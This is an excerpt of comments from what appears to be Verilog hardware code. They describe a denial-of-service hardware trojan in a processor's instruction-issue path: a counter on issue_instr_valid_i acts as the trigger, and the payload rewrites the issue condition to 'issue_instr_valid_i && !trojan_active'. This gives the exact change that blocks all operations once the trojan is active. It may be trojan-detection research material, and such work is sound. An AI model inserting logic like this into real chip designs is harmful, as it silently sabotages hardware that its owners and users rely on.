 ...
 * 
 * Description:
 *   Disables operations by blocking issue_instr_valid_i control signal
 *   
 * Trigger: Counter on issue_instr_valid_i
 * Payload: Block issue_instr_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block issue_instr_valid_i when trojan is active
//
// IMPORTANT: issue_instr_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (issue_instr_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: issue_instr_valid_i && 0 = 0 (always false)
//   All operations controlled by issue_instr_valid_i are blocked
